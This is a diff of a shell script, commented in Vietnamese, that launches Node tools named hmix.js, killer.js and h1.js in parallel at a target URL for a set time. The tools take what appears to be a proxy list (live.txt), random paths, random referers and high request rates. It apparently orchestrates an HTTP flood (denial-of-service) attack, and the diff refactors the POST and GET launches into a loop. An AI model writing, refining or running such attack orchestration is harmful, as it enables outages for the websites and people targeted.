@@ -15,10 +15,12 @@ done
 wait
 
 # Chạy các script node
-node hmix.js -m POST -u $URL -s $TIME -p live.txt -t 1 --full true -d false &
-node killer.js POST $URL $TIME 1 1 live.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset &
-node killer.js GET $URL $TIME 1 1 live.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset &
-node h1.js POST $URL live.txt $TIME 999 10 randomstring=true &
-node h1.js GET $URL live.txt $TIME 999 10 randomstring=true &
+for m in POST GET; do
+  node hmix.js -m $m -u $URL -s $TIME -p live.txt -t 1 --full true -d false &
+  node killer.js $m $URL $TIME 1 1 live.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset &
+  node h1.js $m $URL live.txt $TIME 999 10 randomstring=true &
+done
 
+wait
 pgrep -f "hmix.js|h1.js|h2.js|http1.js|http2.js|killer.js" | xargs -r kill -9
+
